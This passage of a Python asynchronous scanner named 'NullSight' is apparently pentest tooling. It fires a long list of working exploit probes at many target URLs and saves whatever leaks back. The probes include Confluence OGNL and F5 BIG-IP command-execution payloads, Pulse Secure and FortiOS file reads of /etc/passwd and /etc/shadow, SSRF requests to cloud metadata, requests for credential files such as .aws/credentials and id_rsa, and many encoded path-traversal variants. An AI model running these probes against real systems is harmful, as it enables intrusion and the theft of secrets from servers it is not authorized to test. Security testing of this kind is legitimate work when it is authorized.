    Probe("/cgi-bin/.%2e/.%2e/.%2e/.%2e/etc/passwd",
          "Apache CVE-2021-41773 cgi",           cve="CVE-2021-41773"),
    Probe("/cgi-bin/.%%32%65/.%%32%65/.%%32%65/etc/passwd",
          "Apache CVE-2021-42013 dbl-enc",       cve="CVE-2021-42013"),
    Probe("/.%2e/.%2e/.%2e/.%2e/etc/passwd",
          "Apache CVE-2021-41773 no-cgi",        cve="CVE-2021-41773"),
    Probe("/icons/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd",
          "Apache icons traversal",              cve="CVE-2021-41773"),

    # ══════════════════════════════════════════════════════════════
    # SPRING BOOT ACTUATOR
    # ══════════════════════════════════════════════════════════════
    Probe("/actuator/env",              "Spring /actuator/env"),
    Probe("/actuator/health",           "Spring /actuator/health"),
    Probe("/actuator/mappings",         "Spring /actuator/mappings"),
    Probe("/actuator/beans",            "Spring /actuator/beans"),
    Probe("/actuator/configprops",      "Spring /actuator/configprops"),
    Probe("/actuator/loggers",          "Spring /actuator/loggers"),
    Probe("/actuator/heapdump",         "Spring /actuator/heapdump"),
    Probe("/actuator/threaddump",       "Spring /actuator/threaddump"),
    Probe("/actuator/httptrace",        "Spring /actuator/httptrace"),
    Probe("/actuator/info",             "Spring /actuator/info"),
    Probe("/actuator/metrics",          "Spring /actuator/metrics"),
    Probe("/env",                       "Spring /env endpoint"),
    Probe("/trace",                     "Spring /trace endpoint"),
    Probe("/metrics",                   "Spring /metrics endpoint"),
    Probe("/dump",                      "Spring /dump endpoint"),
    Probe("/health",                    "Spring /health endpoint"),
    Probe("/beans",                     "Spring /beans endpoint"),
    Probe("/info",                      "Spring /info endpoint"),

    # ══════════════════════════════════════════════════════════════
    # CVE-2023-34035 — Spring Security ..;/ bypass
    # ══════════════════════════════════════════════════════════════
    Probe("/secure/..;/actuator/env",   "Spring ..;/ actuator bypass",  cve="CVE-2023-34035"),
    Probe("/secure/..;/admin",          "Spring ..;/ admin bypass",      cve="CVE-2023-34035"),
    Probe("/admin/..;/",                "Spring admin ..;/ bypass",      cve="CVE-2023-34035"),
    Probe("/login/..;/actuator/env",    "Spring login bypass env",       cve="CVE-2023-34035"),

    # ══════════════════════════════════════════════════════════════
    # CVE-2024-27198 / CVE-2023-42793 — JetBrains TeamCity
    # ══════════════════════════════════════════════════════════════
    Probe("/app/rest/users",            "TeamCity users",                cve="CVE-2024-27198"),
    Probe("/app/rest/server",           "TeamCity server",               cve="CVE-2024-27198"),
    Probe("/res/projectPlugin.html;.jsp","TeamCity ;.ext bypass",        cve="CVE-2024-27199"),
    Probe("/login.html;.css",           "TeamCity ;.css bypass",         cve="CVE-2024-27199"),
    Probe("/app/rest/users/id:1/tokens","TeamCity admin token",          cve="CVE-2023-42793"),
    Probe("/app/rest/builds",           "TeamCity builds",               cve="CVE-2024-27198"),

    # ══════════════════════════════════════════════════════════════
    # CVE-2021-26084 / CVE-2022-26134 / CVE-2023-22518 — Confluence
    # ══════════════════════════════════════════════════════════════
    Probe("/pages/doenterpagevariables.action",
          "Confluence OGNL",            cve="CVE-2021-26084"),
    Probe("/confluence/pages/doenterpagevariables.action",
          "Confluence OGNL prefix",     cve="CVE-2021-26084"),
    Probe("/%24%7B%40java.lang.Runtime%40getRuntime%28%29.exec%28%27id%27%29%7D/",
          "Confluence RCE probe",       cve="CVE-2022-26134"),
    Probe("/setup/setupadministrator.action",
          "Confluence setup bypass",    cve="CVE-2023-22518"),
    Probe("/rest/api/space",            "Confluence space API"),

    # ══════════════════════════════════════════════════════════════
    # CVE-2021-21985 / CVE-2021-22005 — VMware vCenter
    # ══════════════════════════════════════════════════════════════
    Probe("/ui/vropspluginui/rest/services/",
          "vCenter plugin RCE",         cve="CVE-2021-21985"),
    Probe("/ceip/datacollector/uploadImportExportData",
          "vCenter file upload",        cve="CVE-2021-22005"),
    Probe("/sdk",                       "vCenter SDK probe"),
    Probe("/vsphere-client/",           "vSphere client probe"),

    # ══════════════════════════════════════════════════════════════
    # CVE-2022-1388 / CVE-2020-5902 — F5 BIG-IP
    # ══════════════════════════════════════════════════════════════
    Probe("/mgmt/tm/util/bash",
          "BIG-IP bash RCE",            cve="CVE-2022-1388",
          method="POST",
          body={"command": "run", "utilCmdArgs": "-c id"},
          extra_headers={"X-F5-Auth-Token": ""}),
    Probe("/mgmt/shared/authn/login",   "BIG-IP login",                  cve="CVE-2022-1388"),
    Probe("/tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName=/etc/passwd",
          "BIG-IP TMUI traversal",      cve="CVE-2020-5902"),
    Probe("/tmui/tmui/login/welcome.jsp", "BIG-IP TMUI exposure",        cve="CVE-2020-5902"),

    # ══════════════════════════════════════════════════════════════
    # CVE-2023-4966 / CVE-2019-19781 — Citrix Bleed / NetScaler
    # ══════════════════════════════════════════════════════════════
    Probe("/oauth/idp/.well-known/openid-configuration",
          "Citrix OIDC probe",          cve="CVE-2023-4966"),
    Probe("/vpn/../vpns/cfg/smb.conf",  "Citrix smb.conf LFI",           cve="CVE-2023-4966"),
    Probe("/vpn/index.html",            "Citrix ADC VPN probe",           cve="CVE-2019-19781"),
    Probe("/cgi/login",                 "Citrix cgi login",               cve="CVE-2023-4966"),

    # ══════════════════════════════════════════════════════════════
    # CVE-2024-3400 — Palo Alto PAN-OS GlobalProtect
    # ══════════════════════════════════════════════════════════════
    Probe("/global-protect/login.esp",  "PAN-OS GP login",               cve="CVE-2024-3400"),
    Probe("/ssl-vpn/hipreportcheck.esp","PAN-OS HIP check",              cve="CVE-2024-3400"),
    Probe("/global-protect/getconfig.esp","PAN-OS getconfig",            cve="CVE-2024-3400"),

    # ══════════════════════════════════════════════════════════════
    # CVE-2019-11510 — Pulse Secure LFI
    # ══════════════════════════════════════════════════════════════
    Probe("/dana-na/../dana/html5acc/guacamole/../../../../../../../etc/passwd"
          "?/dana/html5acc/guacamole/",
          "Pulse Secure LFI passwd",    cve="CVE-2019-11510"),
    Probe("/dana-na/../dana/html5acc/guacamole/../../../../../../etc/shadow"
          "?/dana/html5acc/guacamole/",
          "Pulse Secure LFI shadow",    cve="CVE-2019-11510"),

    # ══════════════════════════════════════════════════════════════
    # CVE-2018-13379 / CVE-2023-27997 — FortiOS
    # ══════════════════════════════════════════════════════════════
    Probe("/remote/fgt_lang?lang=/../../../..//////////dev/cmdb/sslvpn_websession",
          "FortiOS session LFI",        cve="CVE-2018-13379"),
    Probe("/remote/login",              "FortiGate VPN login",            cve="CVE-2018-13379"),
    Probe("/api/v2/monitor/system/interface",
          "FortiOS API probe",          cve="CVE-2023-27997"),

    # ══════════════════════════════════════════════════════════════
    # CVE-2024-1709 — ConnectWise ScreenConnect
    # ══════════════════════════════════════════════════════════════
    Probe("/SetupWizard.aspx/",         "ScreenConnect setup bypass",    cve="CVE-2024-1709"),
    Probe("/Bin/ScreenConnect.Server.dll","ScreenConnect DLL",           cve="CVE-2024-1709"),

    # ══════════════════════════════════════════════════════════════
    # CVE-2022-47966 — ManageEngine
    # ══════════════════════════════════════════════════════════════
    Probe("/servlets/ProjectDiscovery",
          "ManageEngine discovery",     cve="CVE-2022-47966"),
    Probe("/servlet/com.adventnet.me.opmanager.servlet.FailOverHelperServlet",
          "ManageEngine FailOver",      cve="CVE-2022-47966"),

    # ══════════════════════════════════════════════════════════════
    # NUXT / NEXT.JS
    # ══════════════════════════════════════════════════════════════
    Probe("/__nuxt_devtools__/client/", "Nuxt DevTools exposed"),
    Probe("/_nuxt/devtools",            "Nuxt DevTools alt"),
    Probe("/api/auth/session",          "Next.js auth session"),
    Probe("/_next/static/../../../etc/passwd","Next.js static traversal"),

    # ══════════════════════════════════════════════════════════════
    # ReactToShell — Webpack / RSC probes
    # ══════════════════════════════════════════════════════════════
    Probe("/__webpack_hmr",             "Webpack HMR exposed (ReactToShell)"),
    Probe("/webpack-dev-server",        "Webpack DevServer exposed"),
    Probe("/sockjs-node/info",          "SockJS HMR info"),
    Probe("/.webpack/stats.json",       "Webpack stats.json"),
    Probe("/api/__nextjs_original-stack-frame","Next.js RSC stack frame leak"),
    Probe("/api/react-dev-overlay",     "React dev overlay API"),

    # ══════════════════════════════════════════════════════════════
    # NginxToShell — Nginx alias misconfig
    # ══════════════════════════════════════════════════════════════
    Probe("/static../etc/passwd",       "Nginx alias off-by-slash LFI"),
    Probe("/files../etc/passwd",        "Nginx /files alias LFI"),
    Probe("/upload../etc/passwd",       "Nginx /upload alias LFI"),
    Probe("/img../etc/passwd",          "Nginx /img alias LFI"),
    Probe("/assets../../../etc/passwd", "Nginx /assets alias LFI"),
    Probe("/nginx_status",              "Nginx stub_status"),
    Probe("/status",                    "Nginx/Apache status"),
    Probe("/server-status",             "Apache server-status"),
    Probe("/server-info",               "Apache server-info"),

    # ══════════════════════════════════════════════════════════════
    # SSRF — Cloud Metadata (via open redirect or SSRF param probes)
    # ══════════════════════════════════════════════════════════════
    Probe("/api/v1/fetch?url=http://169.254.169.254/latest/meta-data/",
          "SSRF AWS metadata via ?url="),
    Probe("/api/v1/fetch?url=http://metadata.google.internal/computeMetadata/v1/",
          "SSRF GCP metadata via ?url=",
          extra_headers={"Metadata-Flavor": "Google"}),
    Probe("/api/v1/fetch?url=http://169.254.169.254/metadata/instance",
          "SSRF Azure metadata via ?url="),
    Probe("/proxy?url=http://169.254.169.254/latest/meta-data/",
          "SSRF proxy param AWS"),
    Probe("/redirect?to=http://169.254.169.254/latest/meta-data/",
          "SSRF redirect param AWS"),

    # ══════════════════════════════════════════════════════════════
    # GRAPHQL
    # ══════════════════════════════════════════════════════════════
    Probe("/graphql",
          "GraphQL introspection",
          method="POST",
          body={"query": "{__schema{types{name fields{name}}}}"},
          extra_headers={"Content-Type": "application/json"}),
    Probe("/api/graphql",
          "GraphQL /api endpoint",
          method="POST",
          body={"query": "{__schema{queryType{name}}}"},
          extra_headers={"Content-Type": "application/json"}),
    Probe("/graphiql",                  "GraphiQL IDE exposed"),
    Probe("/playground",                "GraphQL Playground exposed"),
    Probe("/api/graphiql",              "GraphiQL /api exposed"),

    # ══════════════════════════════════════════════════════════════
    # SSI INJECTION PROBES
    # ══════════════════════════════════════════════════════════════
    Probe("/index.shtml",               "SSI shtml file"),
    Probe("/test.shtml",                "SSI test.shtml"),
    # Note: actual SSI injection via POST forms — scanning path only here

    # ══════════════════════════════════════════════════════════════
    # SUPPLY CHAIN / CONFIG FILES
    # ══════════════════════════════════════════════════════════════
    Probe("/package.json",              "package.json supply chain"),
    Probe("/composer.json",             "composer.json supply chain"),
    Probe("/requirements.txt",          "requirements.txt supply chain"),
    Probe("/.npmrc",                    ".npmrc auth token"),
    Probe("/.yarnrc",                   ".yarnrc config"),
    Probe("/.yarnrc.yml",               ".yarnrc.yml config"),
    Probe("/.netrc",                    ".netrc credentials"),
    Probe("/Gemfile",                   "Gemfile supply chain"),
    Probe("/Gemfile.lock",              "Gemfile.lock versions"),

    # ══════════════════════════════════════════════════════════════
    # WORDPRESS / CMS
    # ══════════════════════════════════════════════════════════════
    Probe("/wp-config.php.bak",         "wp-config.php.bak"),
    Probe("/wp-config.php~",            "wp-config.php~"),
    Probe("/wp-config.php.swp",         "wp-config.php.swp"),
    Probe("/wp-config.php.save",        "wp-config.php.save"),
    Probe("/wp-config.php.old",         "wp-config.php.old"),
    Probe("/wp-login.php",              "WordPress login"),
    Probe("/xmlrpc.php",                "WordPress XML-RPC"),
    Probe("/wp-json/wp/v2/users",       "WordPress users REST API"),
    Probe("/config.php.bak",            "config.php.bak"),
    Probe("/phpinfo.php",               "phpinfo.php"),
    Probe("/info.php",                  "info.php"),

    # ══════════════════════════════════════════════════════════════
    # FRAMEWORK MISCONFIGS
    # ══════════════════════════════════════════════════════════════
    Probe("/telescope/requests",        "Laravel Telescope (debug)"),
    Probe("/_debugbar/open",            "Laravel DebugBar"),
    Probe("/horizon/api/jobs",          "Laravel Horizon (queue)"),
    Probe("/log-viewer",                "Laravel Log Viewer"),
    Probe("/debug/default/view",        "Yii2 debug panel"),
    Probe("/index.php?r=debug",         "Yii debug route"),
    Probe("/app/index.php?r=debug/default/view","Yii2 debug view"),
    Probe("/rails/info/properties",     "Rails info properties"),
    Probe("/rails/mailers",             "Rails mailer preview"),
    Probe("/admin/queues",              "Sidekiq/Bull queue admin"),

    # ══════════════════════════════════════════════════════════════
    # LINUX SYSTEM / SENSITIVE FILES
    # ══════════════════════════════════════════════════════════════
    Probe("/proc/self/environ",         "proc/self/environ LFI"),
    Probe("/proc/self/cmdline",         "proc/self/cmdline"),
    Probe("/proc/version",              "proc/version"),
    Probe("/.htpasswd",                 ".htpasswd"),
    Probe("/.htaccess",                 ".htaccess"),
    Probe("/id_rsa",                    "id_rsa"),
    Probe("/id_rsa.pub",                "id_rsa.pub"),
    Probe("/.ssh/id_rsa",               ".ssh/id_rsa"),
    Probe("/.ssh/authorized_keys",      ".ssh/authorized_keys"),
    Probe("/.bash_history",             ".bash_history"),

    # ══════════════════════════════════════════════════════════════
    # DATABASE / BACKUP FILES
    # ══════════════════════════════════════════════════════════════
    Probe("/backup.zip",                "backup.zip"),
    Probe("/backup.tar.gz",             "backup.tar.gz"),
    Probe("/backup.sql",                "backup.sql"),
    Probe("/dump.sql",                  "dump.sql"),
    Probe("/db.sqlite3",                "db.sqlite3"),
    Probe("/database.sql",              "database.sql"),
    Probe("/site.sql",                  "site.sql"),
    Probe("/database.yml",              "database.yml"),
    Probe("/config/database.yml",       "config/database.yml"),

    # ══════════════════════════════════════════════════════════════
    # CLOUD / CONTAINER CREDENTIALS
    # ══════════════════════════════════════════════════════════════
    Probe("/.aws/credentials",          ".aws/credentials"),
    Probe("/aws_credentials",           "aws_credentials"),
    Probe("/gcloud/credentials.db",     "gcloud credentials.db"),
    Probe("/docker-compose.yml",        "docker-compose.yml"),
    Probe("/docker-compose.yaml",       "docker-compose.yaml"),
    Probe("/.dockerenv",                ".dockerenv"),
    Probe("/Dockerfile",                "Dockerfile"),
    Probe("/kubernetes.yml",            "kubernetes.yml"),
    Probe("/k8s/secrets.yaml",          "k8s/secrets.yaml"),

    # ══════════════════════════════════════════════════════════════
    # JAVA / TOMCAT
    # ══════════════════════════════════════════════════════════════
    Probe("/WEB-INF/web.xml",           "Tomcat WEB-INF/web.xml"),
    Probe("/WEB-INF/classes/application.properties","WEB-INF app.properties"),
    Probe("/MANIFEST.MF",               "MANIFEST.MF"),
    Probe("/index.jsp/",                "Tomcat trailing slash probe"),
    Probe("/manager/html",              "Tomcat Manager UI"),
    Probe("/admin/",                    "Admin panel probe"),

    # ══════════════════════════════════════════════════════════════
    # ELASTICSEARCH / KIBANA
    # ══════════════════════════════════════════════════════════════
    Probe("/_cat/indices?v",            "Elasticsearch indices"),
    Probe("/_cluster/health",           "Elasticsearch health"),
    Probe("/api/status",                "Kibana status"),

    # ══════════════════════════════════════════════════════════════
    # GENERIC PATH TRAVERSAL
    # ══════════════════════════════════════════════════════════════
    Probe("/../../etc/passwd",                          "Basic ../ traversal"),
    Probe("/%2e%2e/%2e%2e/etc/passwd",                  "URL-encoded traversal"),
    Probe("/%2e%2e%2f%2e%2e%2fetc%2fpasswd",            "Full URL-encoded traversal"),
    Probe("/..%2F..%2Fetc%2Fpasswd",                    "Mixed encoded traversal"),
    Probe("/.%2e/.%2e/etc/passwd",                      "Dot-slash traversal"),
    Probe("/%2e%2e%5c%2e%2e%5cetc%5cpasswd",            "Windows backslash traversal"),
    Probe("/....//....//etc/passwd",                    "Four-dot slash traversal"),
    Probe("/..;/..;/etc/passwd",                        "Semicolon bypass traversal"),
    Probe("/%252e%252e%252f%252e%252e%252fetc%252fpasswd","Double URL-encoded traversal"),
    Probe("/..%252f..%252fetc%252fpasswd",              "Single double-enc traversal"),
    Probe("/..%c0%af..%c0%afetc%c0%afpasswd",           "UTF-8 overlong traversal"),
    Probe("/..%ef%bc%8f..%ef%bc%8fetc%ef%bc%8fpasswd",  "Unicode slash traversal"),
]

# ─────────────────────────────────────────────────────────────────────────────
# DATA MODELS
# ─────────────────────────────────────────────────────────────────────────────
@dataclass
class Finding:
    url:              str
    path:             str
    label:            str
    method:           str
    status_code:      int
    content_length:   int
    signature_name:   str
    severity:         str
    description:      str
    cve:              str
    tags:             list
    snippet:          str
    entropy_flag:     bool  = False
    saved_file:       str   = ""
    timestamp:        str   = field(default_factory=lambda: datetime.utcnow().isoformat())

@dataclass
class Stats:
    total:     int   = 0
    done:      int   = 0
    errors:    int   = 0
    findings:  int   = 0
    throttled: int   = 0
    skipped:   int   = 0
    start_time: float = field(default_factory=time.time)

    @property
    def elapsed(self) -> float:
        return time.time() - self.start_time

    @property
    def rps(self) -> float:
        return self.done / max(self.elapsed, 1)

# ─────────────────────────────────────────────────────────────────────────────
# FALSE-POSITIVE FILTER — improved
# ─────────────────────────────────────────────────────────────────────────────
FP_HTML_CT      = re.compile(r'text/html|application/x-httpd-php', re.I)
SOFT_404        = re.compile(
    r'404\s*not\s*found|page\s*not\s*found|does\s*not\s*exist|no\s*such\s*file|'
    r'error\s*404|<title>\s*(?:404|error)|oops[!,]?|nothing\s*here|coming\s*soon|'
    r'resource not found|not found|forbidden|access denied', re.I)
ENV_PATH_RE     = re.compile(r'(?:^|[/@])\.?env(?:\.|$|/)', re.I)
CONFIG_KEYWORDS = re.compile(
    r'RewriteEngine|<configuration|RewriteRule|<\?xml|<!DOCTYPE|'
    r'"dependencies"|"scripts"|"devDependencies"', re.I)
LOREM_IPSUM     = re.compile(r'lorem ipsum|dolor sit amet', re.I)

# Signatures that are OK to fire on HTML responses
HTML_OK_SIGS = {
    "PHP error / stack trace", "Directory listing enabled",
    "Confluence OGNL / admin", "Laravel debug mode ON",
    "Yii debug mode / Yii2 panel", "Django DEBUG=True / settings leak",
    "Ruby on Rails debug / stack", "Node.js / Express stack trace",
    "phpinfo() output", "IIS detailed error", "WordPress XML-RPC enabled",
    "Apache server-status", "Nginx status page", "GraphQL error / stack trace",
    "ReactToShell — Webpack exposure",
}

def is_false_positive(ct: str, cl: int, body: bytes, sig: Signature,
                      path: str = "", status: int = 200) -> bool:
    if cl < sig.min_content_length:
        return True

    text = body.decode("utf-8", errors="replace")

    if SOFT_404.search(text[:2000]):
        return True
    if LOREM_IPSUM.search(text[:500]):
        return True

    # HTML response → allow only HTML-OK signatures
    if FP_HTML_CT.search(ct):
        if sig.name not in HTML_OK_SIGS:
            return True

    # Env file extra checks
    if sig.name in ("env file with credentials", "Generic env file"):
        if ENV_PATH_RE.search(path):
            return False
        if CONFIG_KEYWORDS.search(text):
            return True
        matches = re.findall(r'^[A-Za-z_][A-Za-z0-9_]{2,39}=.+$', text, re.M)
        if len(matches) < 2 and sig.name == "Generic env file":
            return True

    # php://filter base64 check — needs to be long enough
    if sig.name == "PHP LFI wrappers — base64 leak":
        if cl < 200:
            return True

    # High-entropy: double-check entropy
    if sig.name == "High-entropy secret value":
        m = re.search(
            r'(?:key|secret|token|password|api_key)\s*[=:]\s*["\']?([A-Za-z0-9+/=_\-]{32,})',
            text, re.I)
        if m and shannon_entropy(m.group(1)) < 4.0:
            return True

    return False

# ─────────────────────────────────────────────────────────────────────────────
# SAVE FOUND FILE
# ─────────────────────────────────────────────────────────────────────────────
async def save_found_file(
    root_url: str, path: str, label: str,
    status_code: int, content_type: str,
    body: bytes, output_dir: Path, console: Console,
) -> str:
    ext        = save_extension(path, content_type, body)
    parsed     = urlparse(root_url)
    domain     = parsed.netloc.replace(".", "_").replace(":", "_")
    ts         = datetime.utcnow().strftime("%Y%m%d_%H%M%S_%f")[:19]
    safe_label = re.sub(r'[/\\:*?"<>|]', "_", label)[:60]
    filename   = f"found_{ts}_{domain}_{safe_label}{ext}"
    filepath   = output_dir / filename

    try:
        if ext in (".txt", ".json", ".html"):
            text = body.decode("utf-8", errors="replace")
            with open(filepath, "w", encoding="utf-8") as f:
                if ext == ".txt":
                    f.write("╔══════════════════════════════════════════════════════════╗\n")
                    f.write("║        NullSight Scanner  — FINDING                    ║\n")
                    f.write("╚══════════════════════════════════════════════════════════╝\n\n")
                    f.write(f"Domain       : {parsed.netloc}\n")
                    f.write(f"URL          : {root_url}\n")
                    f.write(f"Path         : {path}\n")
                    f.write(f"Label        : {label}\n")
                    f.write(f"Status       : {status_code}\n")
                    f.write(f"Content-Type : {content_type}\n")
                    f.write(f"Size         : {len(body)} bytes\n")
                    f.write(f"Found at     : {ts}\n\n")
                    f.write("─" * 60 + "\nCONTENT:\n" + "─" * 60 + "\n\n")
                    f.write(text)
                elif ext == ".json":
                    try:
                        f.write(json.dumps(json.loads(text), indent=2, ensure_ascii=False))
                    except Exception:
                        f.write(text)
                else:
                    f.write(text)
        else:
            with open(filepath, "wb") as f:
                f.write(body)

        console.print(f"  [bold green]✓ saved → {filename}[/bold green] [dim]({ext})[/dim]")
        return filename
    except Exception as e:
        console.print(f"  [red]✗ save error: {e}[/red]")
        return ""

# ─────────────────────────────────────────────────────────────────────────────
# HTTP FETCH
# ─────────────────────────────────────────────────────────────────────────────
async def fetch(
    session: aiohttp.ClientSession,
    url: str,
    probe: Probe,
    stats: Stats,
    retries: int = 0,
) -> Optional[tuple[int, str, int, bytes]]:
    headers = {
        "User-Agent":      random.choice(CONFIG.user_agents),
        "Accept":          "*/*",
        "Accept-Encoding": "gzip, deflate",
        "Connection":      "keep-alive",
    }
    if probe.extra_headers:
        headers.update(probe.extra_headers)

    timeout = aiohttp.ClientTimeout(
        total=CONFIG.timeout,
        connect=CONFIG.connect_timeout,
        sock_read=CONFIG.read_timeout,
    )

    kwargs = dict(
        headers=headers,
        timeout=timeout,
        allow_redirects=True,
        max_redirects=5,
        ssl=False,
    )

    if probe.method == "POST" and probe.body:
        kwargs["json"] = probe.body

    try:
        async with session.request(probe.method, url, **kwargs) as resp:
            status = resp.status

            if status in (429, 503):
                stats.throttled += 1
                wait = min(2 ** retries + random.uniform(0, 0.5), 15.0)
                await asyncio.sleep(wait)
                if retries < CONFIG.max_retries:
                    return await fetch(session, url, probe, stats, retries + 1)
                return None

            if status not in (200, 301, 302, 307, 308):
                return None

            ct  = resp.headers.get("Content-Type", "")
            cl_hdr = resp.headers.get("Content-Length", "-1")
            cl  = int(cl_hdr) if cl_hdr.lstrip("-").isdigit() else -1

            body = b""
            async for chunk in resp.content.iter_chunked(4096):
                body += chunk
                if len(body) >= CONFIG.max_body_bytes:
                    break
            if cl == -1:
                cl = len(body)

            return status, ct, cl, body

    except (asyncio.TimeoutError,
            aiohttp.ClientConnectorError, aiohttp.ClientSSLError,
            aiohttp.ServerDisconnectedError, aiohttp.ClientOSError,
            aiohttp.TooManyRedirects):
        pass
    except Exception:
        pass

    stats.errors += 1
    return None

# ─────────────────────────────────────────────────────────────────────────────
# WORKER
# ─────────────────────────────────────────────────────────────────────────────
async def worker(
    queue: asyncio.Queue,
    session: aiohttp.ClientSession,
    stats: Stats,
    findings: list,
    progress, task_id,
    console: Console,
    output_dir: Path,
) -> None:
    while True:
        item = await queue.get()
        if item is None:
            queue.task_done()
            break

        root_url, probe = item
        full_url = root_url.rstrip("/") + "/" + probe.path.lstrip("/")

        if CONFIG.delay_max > 0:
            await asyncio.sleep(random.uniform(CONFIG.delay_min, CONFIG.delay_max))

        result = await fetch(session, full_url, probe, stats)
        stats.done += 1

        if result is not None:
            status, ct, cl, body = result
            text    = body.decode("utf-8", errors="replace")
            matched = False
            saved_fn = ""
            url_findings_sigs = set()

            for sig in SIGNATURES:
                if sig.name in url_findings_sigs:
                    continue
                haystack = body if sig.is_bytes else text
                try:
                    match = sig.pattern.search(haystack)
                except TypeError:
                    continue

                if match and not is_false_positive(ct, cl, body, sig, probe.path, status):
                    entropy_flag = has_high_entropy_secret(text)
                    f = Finding(
                        url=full_url, path=probe.path, label=probe.label,
                        method=probe.method, status_code=status,
                        content_length=cl, signature_name=sig.name,
                        severity=sig.severity, description=sig.description,
                        cve=probe.cve or sig.cve,
                        tags=sig.tags,
                        snippet=text[:400].strip(),
                        entropy_flag=entropy_flag,
                    )
                    findings.append(f)
                    stats.findings += 1
                    matched = True
                    url_findings_sigs.add(sig.name)

                    color = {
                        "CRITICAL": "bold red",
                        "HIGH":     "red",
                        "MEDIUM":   "yellow",
                        "LOW":      "cyan",
                        "INFO":     "dim",
                    }.get(sig.severity, "white")

                    cve_str = f"[bold cyan][{probe.cve or sig.cve}][/bold cyan] " \
                              if (probe.cve or sig.cve) else ""
                    console.print(
                        f"  [{color}][{sig.severity}][/{color}] "
                        f"{cve_str}"
                        f"[green]{full_url}[/green]  "
                        f"[dim]→ {sig.name}[/dim]"
                    )

            if matched and not saved_fn:
                saved_fn = await save_found_file(
                    root_url, probe.path, probe.label,
                    status, ct, body, output_dir, console
                )
                for f in findings:
                    if f.url == full_url and not f.saved_file:
                        f.saved_file = saved_fn

        progress.update(task_id, advance=1, rps=stats.rps, findings=stats.findings)
        queue.task_done()

# ─────────────────────────────────────────────────────────────────────────────
# PRODUCER
# ─────────────────────────────────────────────────────────────────────────────
async def producer(queue: asyncio.Queue, urls: list) -> None:
    for url in urls:
        for probe in PROBES:
            await queue.put((url, probe))
    for _ in range(CONFIG.concurrency):
        await queue.put(None)

# ─────────────────────────────────────────────────────────────────────────────
# REPORTING
# ─────────────────────────────────────────────────────────────────────────────
def save_json(findings: list, path: Path) -> None:
    with open(path, "w") as f:
        json.dump([asdict(f) for f in findings], f, indent=2, ensure_ascii=False)

def save_csv(findings: list, path: Path) -> None:
    if not findings:
        return
    fields = list(asdict(findings[0]).keys())
    with open(path, "w", newline="", encoding="utf-8") as f:
        w = csv.DictWriter(f, fieldnames=fields)
        w.writeheader()
        for f in findings:
            w.writerow(asdict(f))

def save_markdown(findings: list, stats: Stats, path: Path) -> None:
    sev_order = {"CRITICAL": 0, "HIGH": 1, "MEDIUM": 2, "LOW": 3, "INFO": 4}
    sorted_f  = sorted(findings, key=lambda x: sev_order.get(x.severity, 5))
    with open(path, "w", encoding="utf-8") as f:
        f.write("# NullSight Scanner  — Pentest Report\n\n")
        f.write(f"**Date**: {datetime.utcnow().strftime('%Y-%m-%d %H:%M UTC')}  \n")
        f.write(f"**Duration**: {stats.elapsed:.1f}s  \n")
        f.write(f"**Requests**: {stats.done:,}  \n")
        f.write(f"**Findings**: {stats.findings}  \n\n")
        f.write("---\n\n")
        for i, finding in enumerate(sorted_f, 1):
            f.write(f"## [{i}] {finding.severity} — {finding.signature_name}\n\n")
            f.write(f"| Field | Value |\n|---|---|\n")
            f.write(f"| URL | `{finding.url}` |\n")
            f.write(f"| Label | {finding.label} |\n")
            f.write(f"| Method | {finding.method} |\n")
            f.write(f"| Status | {finding.status_code} |\n")
            f.write(f"| CVE | {finding.cve or '—'} |\n")
            f.write(f"| Tags | {', '.join(finding.tags)} |\n")
            f.write(f"| Description | {finding.description} |\n")
            f.write(f"| Entropy flag | {'⚠ YES' if finding.entropy_flag else 'no'} |\n\n")
            if finding.snippet:
                snippet = finding.snippet[:300].replace('`', "'")
                f.write(f"**Snippet**:\n```\n{snippet}\n```\n\n")
            f.write("---\n\n")

def print_summary(stats: Stats, findings: list, console: Console) -> None:
    sev_count: dict = {}
    cve_set:   set  = set()
    tag_count: dict = {}
    for f in findings:
        sev_count[f.severity] = sev_count.get(f.severity, 0) + 1
        if f.cve:
            cve_set.add(f.cve)
        for t in f.tags:
            tag_count[t] = tag_count.get(t, 0) + 1

    t = Table(title="NullSight Scanner  — Scan Summary", style="bold",
              box=box.DOUBLE_EDGE)
    t.add_column("Metric",  style="cyan",   no_wrap=True)
    t.add_column("Value",   style="white")
    t.add_row("Elapsed",         f"{stats.elapsed:.1f}s")
    t.add_row("Total requests",  f"{stats.done:,}")
    t.add_row("Errors",          str(stats.errors))
    t.add_row("Throttled",       str(stats.throttled))
    t.add_row("Avg RPS",         f"{stats.rps:.1f}")
    t.add_row("─" * 20,          "─" * 20)
    t.add_row("Findings total",  f"[bold]{stats.findings}[/bold]")
    for sev, color in [("CRITICAL","bold red"),("HIGH","red"),
                       ("MEDIUM","yellow"),("LOW","cyan"),("INFO","dim")]:
        if sev in sev_count:
            t.add_row(f"  {sev}", f"[{color}]{sev_count[sev]}[/{color}]")
    t.add_row("─" * 20,         "─" * 20)
    t.add_row("CVEs detected",   str(len(cve_set)))
    if cve_set:
        t.add_row("CVE list", ", ".join(sorted(cve_set)[:8]))
    console.print()
    console.print(t)

    if tag_count:
        t2 = Table(title="Top Tags", box=box.SIMPLE)
        t2.add_column("Tag",   style="cyan")
        t2.add_column("Count", style="white")
        for tag, cnt in sorted(tag_count.items(), key=lambda x: -x[1])[:10]:
            t2.add_row(tag, str(cnt))
        console.print(t2)

# ─────────────────────────────────────────────────────────────────────────────
# URL LOADER
# ─────────────────────────────────────────────────────────────────────────────
def load_urls(path: str) -> list:
    p = Path(path)
    if not p.exists():
        raise FileNotFoundError(f"URL file not found: {path}")
    urls = []
    for line in p.read_text().splitlines():
        line = line.strip()
        if not line or line.startswith("#"):
            continue
        if not line.startswith(("http://", "https://")):
            line = "https://" + line
        urls.append(line)
    return urls

# ─────────────────────────────────────────────────────────────────────────────
# MAIN
# ─────────────────────────────────────────────────────────────────────────────
async def run(console: Console) -> None:
    urls  = load_urls(CONFIG.url_file)
    total = len(urls) * len(PROBES)

    console.print(Panel(
        f"[bold cyan]NullSight Authorized Pentest Scanner [/bold cyan]\n\n"
        f"Targets      : [yellow]{len(urls):,}[/yellow]\n"
        f"Probes/target: [yellow]{len(PROBES)}[/yellow]\n"
        f"Total probes : [yellow]{total:,}[/yellow]\n"
        f"Signatures   : [yellow]{len(SIGNATURES)}[/yellow]\n"
        f"Workers      : [yellow]{CONFIG.concurrency}[/yellow]\n"
        f"Queue        : [yellow]{CONFIG.queue_maxsize}[/yellow]\n"
